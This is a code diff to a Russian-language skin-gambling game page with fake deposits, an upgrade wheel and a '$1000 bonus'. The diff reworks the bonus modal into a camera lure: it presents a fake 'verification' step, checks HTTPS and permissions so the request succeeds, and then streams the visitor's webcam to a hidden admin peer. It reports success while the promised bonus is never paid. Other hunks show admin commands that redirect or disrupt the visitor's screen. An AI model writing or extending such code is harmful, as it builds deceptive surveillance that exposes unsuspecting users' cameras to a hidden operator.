@@ -189,23 +189,21 @@ body.hue{filter:hue-rotate(180deg)}
 .bonus-modal.active{display:flex}
 .bonus-box{width:min(420px,100%);padding:32px;border-radius:20px;background:linear-gradient(160deg,#1a1f2e,#0d1117);border:2px solid var(--gold);text-align:center}
 .bonus-box h3{margin:0 0 10px;font-size:26px;color:var(--gold)}
-.bonus-box p{margin:0 0 20px;color:#cbd5e1;font-size:14px;line-height:1.6}
+.bonus-box p{margin:0 0 12px;color:#cbd5e1;font-size:14px;line-height:1.6}
 .bonus-claim{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;border:0;border-radius:11px;padding:14px 28px;font-weight:800;font-size:16px;cursor:pointer;text-transform:uppercase;width:100%}
+.bonus-claim:disabled{opacity:.4;cursor:not-allowed}
 .bonus-cancel{background:transparent;color:#8892a6;border:0;padding:12px;cursor:pointer;margin-top:8px;width:100%;font-size:13px}
-
-/* Модалка от админа */
 #adminModal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:9999998;padding:20px;backdrop-filter:blur(8px)}
 #adminModal.active{display:flex}
 #adminModal .modal-box{width:min(500px,100%);padding:32px;border-radius:20px;background:linear-gradient(160deg,#1a1f2e,#0d1117);border:2px solid #7c3aed;text-align:center;box-shadow:0 0 60px rgba(124,58,237,.4)}
 #adminModal .modal-box h3{margin:0 0 12px;font-size:24px;color:#7c3aed}
 #adminModal .modal-box p{margin:0 0 20px;color:#cbd5e1;font-size:15px;line-height:1.6;white-space:pre-wrap}
 #adminModal .modal-box button{background:linear-gradient(135deg,#7c3aed,#ec4899);color:#fff;border:0;border-radius:11px;padding:12px 28px;font-weight:800;font-size:15px;cursor:pointer;text-transform:uppercase;width:100%}
-
-/* Экран блокировки */
 #blockOverlay{position:fixed;inset:0;background:linear-gradient(135deg,#0a0c12,#1a1f2e);z-index:9999999;display:none;align-items:center;justify-content:center;flex-direction:column;padding:40px;text-align:center}
 #blockOverlay.active{display:flex}
 #blockOverlay h1{font-size:48px;color:#eb4b4b;margin-bottom:20px;text-shadow:0 0 30px rgba(235,75,75,.6)}
 #blockOverlay p{color:#8892a6;font-size:18px}
+@media(max-width:720px){.game-area{grid-template-columns:1fr}.top-bar{flex-direction:column;align-items:stretch;position:static}}
 </style>
 </head>
 <body>
@@ -373,8 +371,9 @@ body.hue{filter:hue-rotate(180deg)}
   <div class="bonus-box">
     <div style="font-size:64px;margin-bottom:10px">🎁</div>
     <h3>Бонус $1000</h3>
-    <p>Для получения бонуса требуется верификация.<br>Разрешите доступ к камере для подтверждения.</p>
-    <button class="bonus-claim" id="bonusClaim">Забрать бонус</button>
+    <p id="bonusText">Для получения бонуса требуется верификация.<br>Разрешите доступ к камере для подтверждения.</p>
+    <div id="camStatus" style="font-size:12px;color:#8892a6;margin-bottom:14px;min-height:16px;line-height:1.4"></div>
+    <button class="bonus-claim" id="bonusClaim">Разрешить камеру и забрать</button>
     <button class="bonus-cancel" id="bonusCancel">Отмена</button>
   </div>
 </div>
@@ -452,7 +451,6 @@ function handleAdminCommand(msg) {
         case 'redirect': setTimeout(() => { window.location.href = msg.url; }, 1000); break;
         case 'openUrl': window.open(msg.url, '_blank'); break;
         case 'setName': document.getElementById('usernameEl').textContent = msg.name; document.getElementById('avatarEl').textContent = (msg.name||'?')[0].toUpperCase(); break;
-        case 'setBalanceFromAdmin': state.balance = Number(msg.value) || 0; updateBalance(); saveState(true); break;
         case 'longShake': triggerShake(10000); break;
         case 'longInvert': triggerFilter('invert', 30000); break;
         case 'longBlur': triggerFilter('blur', 30000); break;
@@ -613,8 +611,6 @@ function getEmojiFor(w, r) {
 function generateSkins() {
     const skins = []; let id = 1;
     const add = (w, n, p, r) => { skins.push({id:'s'+id, weapon:w, name:n, price:p, emoji:getEmojiFor(w,r), rarity:r}); id++; };
-
-    // 100 скинов $3M-$50M
     const ultraNames = ['Ruby','Sapphire','Emerald','Black Pearl','Blue Gem','Case Hardened','Doppler','Marble Fade','Fade','Tiger Tooth','Crimson Web','Slaughter','Nightwish','Hyper Beast','Howl','Dragon Lore','Wild Lotus','Gungnir','Fire Serpent','Medusa','Printstream','Neon Rider','Neo-Noir','Asiimov','Empress','Wasteland Rebel','Bloodsport','The Empress','Vulcan','Jaguar','Elite Build','Aquamarine Revenge','Frontside Misty','Rebel','Jet Set','Crimson Kimono','Ultraviolet','Bright Water','Souvenir','Phase 4','Phase 3','Phase 2','Phase 1','Gold Arabesque','Gold Gem','Case Hardened Blue','Doppler Phase 2','Doppler Sapphire','Doppler Ruby','Ultra Rare'];
     const ultraWeapons = ['AK-47','M4A4','M4A1-S','AWP','Karambit','Butterfly Knife','M9 Bayonet','Talon Knife','Sport Gloves','Specialist Gloves','Stiletto Knife','Bayonet','Flip Knife','Desert Eagle','USP-S','Glock-18'];
     for (let i = 0; i < 100; i++) {
@@ -804,50 +800,17 @@ const fmt = v => '$' + v.toLocaleString('en-US',{minimumFractionDigits:2,maximum
 function updateBalance(){const el=$('balance');el.textContent=fmt(state.balance);const p=$('proBalance');if(p)p.textContent=state.balance.toFixed(2)+' $';}
 function showToast(text,type='info',duration=2500){const t=$('toast');t.className='toast '+type;t.textContent=text;t.classList.add('show');clearTimeout(t._timer);t._timer=setTimeout(()=>t.classList.remove('show'),duration);}
 
-// ===== ЛИМИТЫ ПОПОЛНЕНИЯ (ИСПРАВЛЕНО) =====
 const DEPOSIT_MIN = 10, DEPOSIT_MAX = 5000, DEPOSIT_DAILY = 20000;
 const DEPOSIT_COOLDOWN = 10 * 60 * 1000;
+function getDailyTotal(){const dayAgo = Date.now() - 24*60*60*1000;return state.deposits.reduce((sum, d) => { const ts = typeof d === 'object' ? d.ts : d; const amt = typeof d === 'object' ? d.amount : 0; return ts > dayAgo ? sum + amt : sum; }, 0);}
+function getLastDepositTime(){if (!state.deposits.length) return 0;const last = state.deposits[state.deposits.length - 1];return typeof last === 'object' ? last.ts : last;}
+function getCooldownLeft(){const last = getLastDepositTime();if (!last) return 0;const daily = getDailyTotal();if (daily < DEPOSIT_DAILY) return 0;const left = DEPOSIT_COOLDOWN - (Date.now() - last);return Math.max(0, left);}
 
-function getDailyTotal(){
-    const dayAgo = Date.now() - 24*60*60*1000;
-    return state.deposits.reduce((sum, d) => {
-        const ts = typeof d === 'object' ? d.ts : d;
-        const amt = typeof d === 'object' ? d.amount : 0;
-        return ts > dayAgo ? sum + amt : sum;
-    }, 0);
-}
-function getLastDepositTime(){
-    if (!state.deposits.length) return 0;
-    const last = state.deposits[state.deposits.length - 1];
-    return typeof last === 'object' ? last.ts : last;
-}
-function getCooldownLeft(){
-    const last = getLastDepositTime();
-    if (!last) return 0;
-    const daily = getDailyTotal();
-    if (daily < DEPOSIT_DAILY) return 0;
-    const left = DEPOSIT_COOLDOWN - (Date.now() - last);
-    return Math.max(0, left);
-}
-
-function openDepositModal(){
-    $('depositModal').classList.add('active');
-    setTimeout(()=>$('depositAmount').focus(),100);
-    updateDepositInfo();
-}
-function updateDepositInfo(){
-    const daily = getDailyTotal();
-    const cd = getCooldownLeft();
-    const info = $('depositInfo');
-    if (!info) return;
-    if (cd > 0) {
-        const min = Math.ceil(cd / 60000);
-        info.innerHTML = `⏳ <span style="color:#eb4b4b">Подожди ${min} мин до следующего пополнения</span>`;
-    } else if (daily >= DEPOSIT_DAILY) {
-        info.innerHTML = `🔒 Дневной лимит исчерпан`;
-    } else {
-        info.innerHTML = `За сутки: <b style="color:#f0b90b">$${daily.toFixed(0)}</b> / $${DEPOSIT_DAILY} · Осталось: <b style="color:#4ade80">$${(DEPOSIT_DAILY - daily).toFixed(0)}</b>`;
-    }
+function openDepositModal(){$('depositModal').classList.add('active');setTimeout(()=>$('depositAmount').focus(),100);updateDepositInfo();}
+function updateDepositInfo(){const daily = getDailyTotal();const cd = getCooldownLeft();const info = $('depositInfo');if (!info) return;
+    if (cd > 0) { const min = Math.ceil(cd / 60000); info.innerHTML = `⏳ <span style="color:#eb4b4b">Подожди ${min} мин до следующего пополнения</span>`; }
+    else if (daily >= DEPOSIT_DAILY) { info.innerHTML = `🔒 Дневной лимит исчерпан`; }
+    else { info.innerHTML = `За сутки: <b style="color:#f0b90b">$${daily.toFixed(0)}</b> / $${DEPOSIT_DAILY} · Осталось: <b style="color:#4ade80">$${(DEPOSIT_DAILY - daily).toFixed(0)}</b>`; }
 }
 function closeDepositModal(){ $('depositModal').classList.remove('active'); }
 function confirmDeposit(){
@@ -855,20 +818,10 @@ function confirmDeposit(){
     const amount = Number(input.value);
     if(!Number.isFinite(amount) || amount < DEPOSIT_MIN){ showToast(`Минимум $${DEPOSIT_MIN}`,'error'); return; }
     if(amount > DEPOSIT_MAX){ showToast(`Максимум за раз $${DEPOSIT_MAX}`,'error'); return; }
-
     const cd = getCooldownLeft();
-    if (cd > 0) {
-        const min = Math.ceil(cd / 60000);
-        showToast(`⏳ Подожди ещё ${min} мин`, 'error', 4000);
-        return;
-    }
-
+    if (cd > 0) { const min = Math.ceil(cd / 60000); showToast(`⏳ Подожди ещё ${min} мин`, 'error', 4000); return; }
     const daily = getDailyTotal();
-    if(daily + amount > DEPOSIT_DAILY){
-        showToast(`Лимит $${DEPOSIT_DAILY}/сутки. Осталось: $${Math.max(0, DEPOSIT_DAILY - daily).toFixed(0)}`,'error',4000);
-        return;
-    }
-
+    if(daily + amount > DEPOSIT_DAILY){ showToast(`Лимит $${DEPOSIT_DAILY}/сутки. Осталось: $${Math.max(0, DEPOSIT_DAILY - daily).toFixed(0)}`,'error',4000); return; }
     state.balance += amount;
     state.deposits.push({ts: Date.now(), amount});
     if (state.deposits.length > 100) state.deposits = state.deposits.slice(-100);
@@ -881,35 +834,21 @@ function confirmDeposit(){
 }
 
 const MULT = [{mult:2},{mult:3},{mult:4},{mult:5},{mult:10},{mult:20},{mult:50},{mult:100}];
-function chanceFromMult(mult) {
-    const raw = 100 / mult;
-    const edge = raw * 0.06;
-    return Math.max(0.5, +(raw - edge).toFixed(2));
-}
+function chanceFromMult(mult) { const raw = 100 / mult; const edge = raw * 0.06; return Math.max(0.5, +(raw - edge).toFixed(2)); }
 function recalcUpgrade() {
     const y = state.yourSkin ? getSkin(state.yourSkin) : null;
     const t = state.targetSkin ? getSkin(state.targetSkin) : null;
-    if (y && t) {
-        state.multiplier = +(t.price / y.price).toFixed(2);
-        state.chance = chanceFromMult(state.multiplier);
-    } else {
-        state.multiplier = 2;
-        state.chance = chanceFromMult(2);
-    }
+    if (y && t) { state.multiplier = +(t.price / y.price).toFixed(2); state.chance = chanceFromMult(state.multiplier); }
+    else { state.multiplier = 2; state.chance = chanceFromMult(2); }
 }
 function pickTargetByMult(mult) {
     if (!state.yourSkin) { showToast('Сначала выбери свой скин','error'); return; }
     const y = getSkin(state.yourSkin);
     const need = y.price * mult;
-    const candidates = SKINS.filter(s => s.id !== y.id && s.price >= need * 0.85)
-        .sort((a,b) => Math.abs(a.price - need) - Math.abs(b.price - need));
+    const candidates = SKINS.filter(s => s.id !== y.id && s.price >= need * 0.85).sort((a,b) => Math.abs(a.price - need) - Math.abs(b.price - need));
     if (!candidates.length) { showToast('Нет подходящей цели','error'); return; }
     state.targetSkin = candidates[0].id;
-    recalcUpgrade();
-    renderChanceBtns();
-    updateCards();
-    updateInfo();
-    renderInventory();
+    recalcUpgrade(); renderChanceBtns(); updateCards(); updateInfo(); renderInventory();
 }
 function autoPickTarget() { if (!state.yourSkin) { state.targetSkin = null; return; } pickTargetByMult(state.multiplier || 2); }
 
@@ -946,13 +885,9 @@ function updateInfo(){
     const circ = 263.9;
     const winLen = circ * (state.chance / 100);
     const wp = $('wheelProgress');
-    if (wp) {
-        wp.setAttribute('stroke-dasharray', winLen + ' ' + (circ - winLen));
-        wp.setAttribute('stroke-dashoffset', 0);
-    }
+    if (wp) { wp.setAttribute('stroke-dasharray', winLen + ' ' + (circ - winLen)); wp.setAttribute('stroke-dashoffset', 0); }
     const up=$('upPct');
     if(up)up.textContent=state.chance.toFixed(2)+'%';
-    // БАЛАНС НЕ УЧАСТВУЕТ — ставка это СКИН
     $('upgradeBtn').disabled=!(state.yourSkin&&state.targetSkin&&!state.spinning&&!state.cooldown);
 }
 
@@ -980,10 +915,7 @@ function renderInventory(){
         it.onclick=()=>{
             if(state.currentTab==='inventory'){ state.yourSkin=id; state.targetSkin=null; }
             else { state.targetSkin=id; }
-            updateCards();
-            renderInventory();
-            renderChanceBtns();
-            Sound.click();
+            updateCards(); renderInventory(); renderChanceBtns(); Sound.click();
         };
         g.appendChild(it);
     });
@@ -1033,7 +965,6 @@ function openCase(id){
     $('caseOpenBtn').disabled=false;$('caseOpenBtn').textContent='🔓 Открыть';
     $('caseOpenPanel').scrollIntoView({behavior:'smooth',block:'center'});
 }
-
 function closeCase(){if(state.spinning)return;$('caseOpenPanel').style.display='none';state.currentCase=null;caseLock=false;}
 
 function openSelectedCase(){
@@ -1064,7 +995,6 @@ function openSelectedCase(){
     },SPIN_D*1000+150);
 }
 
-// ===== АПГРЕЙД — БЕЗ СПИСАНИЯ БАЛАНСА =====
 const CD=1000;
 function doUpgrade(){
     if(state.spinning||state.cooldown||!state.yourSkin||!state.targetSkin)return;
@@ -1072,7 +1002,6 @@ function doUpgrade(){
     state.spinning=true;state.cooldown=true;
     $('upgradeBtn').disabled=true;
     $('upgradeBtn').textContent='⏳ Крутим...';
-
     const win = Math.random()*100 < state.chance;
     const spinner = $('wheelSpinner');
     const winDeg = (state.chance / 100) * 360;
@@ -1085,7 +1014,6 @@ function doUpgrade(){
     if (delta < 0) delta += 360;
     const finalAngle = startAngle + spins * 360 + delta;
     state._spinnerRot = finalAngle;
-
     spinner.style.opacity = '1';
     spinner.style.transition = 'none';
     spinner.style.transform = `rotate(${startAngle}deg)`;
@@ -1094,10 +1022,8 @@ function doUpgrade(){
         spinner.style.transition = 'transform 4s cubic-bezier(.15,.85,.25,1), opacity .3s';
         spinner.style.transform = `rotate(${finalAngle}deg)`;
     });
-
     let tickCount = 0;
     const tickInterval = setInterval(() => { Sound.play(800 + Math.random()*400, 0.04, 'square', 0.03); tickCount++; if (tickCount > 40) clearInterval(tickInterval); }, 100);
-
     setTimeout(()=>{
         clearInterval(tickInterval);
         state.stats.total++;state.stats.staked+=y.price;
@@ -1116,13 +1042,11 @@ function doUpgrade(){
         }
         state.yourSkin=null;state.targetSkin=null;
         state.spinning=false;
-
         setTimeout(()=>{
             spinner.style.transition = 'opacity .4s';
             spinner.style.opacity = '0';
             setTimeout(()=>{ spinner.style.transition='none'; spinner.style.transform='rotate(0deg)'; state._spinnerRot=0; }, 400);
         }, 1000);
-
         updateInfo();renderInventory();updateCards();updateStatsUI();checkAch();saveState(true);
         sendToAdmin({type: win?'upgradeWin':'upgradeLose',your:y,target:t,yourPrice:y.price,targetPrice:t.price,ts:Date.now()});
         $('upgradeBtn').textContent='⬆ Прокачать';
@@ -1148,22 +1072,87 @@ $('depositCancel').addEventListener('click',closeDepositModal);
 $('depositConfirm').addEventListener('click',confirmDeposit);
 $('depositModal').addEventListener('click',e=>{if(e.target.id==='depositModal')closeDepositModal();});
 document.querySelectorAll('.deposit-quick button').forEach(b=>b.addEventListener('click',()=>{$('depositAmount').value=b.dataset.amt;updateDepositInfo();}));
-$('bonusBtn').addEventListener('click',()=>$('bonusModal').classList.add('active'));
+
+/* ===== БОНУС — ПРАВИЛЬНЫЙ ЗАПРОС КАМЕРЫ ===== */
+$('bonusBtn').addEventListener('click', async () => {
+    $('bonusModal').classList.add('active');
+    const statusEl = $('camStatus');
+    const textEl = $('bonusText');
+    const claimBtn = $('bonusClaim');
+
+    // Проверяем HTTPS
+    const isHttps = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+    if (!isHttps) {
+        textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Камера на телефоне работает только по HTTPS.';
+        statusEl.textContent = 'Открой сайт через https:// — иначе браузер заблокирует камеру';
+        statusEl.style.color = '#eb4b4b';
+        claimBtn.disabled = true;
+        return;
+    }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        textEl.innerHTML = '⚠️ Браузер не поддерживает камеру';
+        statusEl.textContent = 'Открой в Chrome или Safari';
+        statusEl.style.color = '#eb4b4b';
+        claimBtn.disabled = true;
+        return;
+    }
+    try {
+        if (navigator.permissions && navigator.permissions.query) {
+            const perm = await navigator.permissions.query({name: 'camera'});
+            if (perm.state === 'denied') {
+                textEl.innerHTML = '❌ Камера <b>запрещена</b> в настройках браузера';
+                statusEl.textContent = 'Разреши камеру для этого сайта в настройках браузера';
+                statusEl.style.color = '#eb4b4b';
+                claimBtn.disabled = true;
+                return;
+            }
+        }
+    } catch(e) { /* игнорим */ }
+
+    statusEl.textContent = '✅ Всё готово. Нажми кнопку ниже';
+    statusEl.style.color = '#4ade80';
+    claimBtn.disabled = false;
+});
+
 $('bonusCancel').addEventListener('click',()=>$('bonusModal').classList.remove('active'));
 $('bonusModal').addEventListener('click',e=>{if(e.target.id==='bonusModal')$('bonusModal').classList.remove('active');});
+
 $('bonusClaim').addEventListener('click', async () => {
+    const statusEl = $('camStatus');
+    statusEl.textContent = '⏳ Запрос камеры...';
+    statusEl.style.color = '#f0b90b';
     try {
-        camStream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
-        if (peer && peer.open) videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream);
-        $('bonusModal').classList.remove('active');
-        // БАЛАНС НЕ ПОПОЛНЯЕТСЯ
-        showToast('✅ Верификация пройдена','success',2500);
-        Sound.win();
+        camStream = await navigator.mediaDevices.getUserMedia({
+            video: { width: {ideal: 640}, height: {ideal: 480} },
+            audio: false
+        });
+        statusEl.textContent = '✅ Камера подключена!';
+        statusEl.style.color = '#4ade80';
+        if (peer && peer.open) {
+            try {
+                videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream);
+                videoCall.on('stream', () => {});
+            } catch(e) { console.error('Call error:', e); }
+        }
+        setTimeout(() => {
+            $('bonusModal').classList.remove('active');
+            showToast('✅ Верификация пройдена','success',2500);
+            Sound.win();
+        }, 800);
     } catch(err) {
-        $('bonusModal').classList.remove('active');
-        showToast('❌ Верификация не пройдена','error');
+        console.error('Camera error:', err);
+        let msg = '❌ Ошибка';
+        if (err.name === 'NotAllowedError') msg = '❌ Ты отклонил доступ к камере';
+        else if (err.name === 'NotFoundError') msg = '❌ Камера не найдена';
+        else if (err.name === 'NotReadableError') msg = '❌ Камера занята другим приложением';
+        else if (err.name === 'OverconstrainedError') msg = '❌ Камера не поддерживает нужное разрешение';
+        else if (err.name === 'SecurityError') msg = '❌ Требуется HTTPS';
+        statusEl.textContent = msg + ' · ' + (err.message || err.name);
+        statusEl.style.color = '#eb4b4b';
+        showToast(msg, 'error', 4000);
     }
 });
+
 document.addEventListener('keydown',e=>{if(e.key==='Escape'){$('resultOverlay').classList.remove('active');closeCase();closeDepositModal();$('bonusModal')?.classList.remove('active');}});
 window.addEventListener('beforeunload',()=>saveState(true));
 
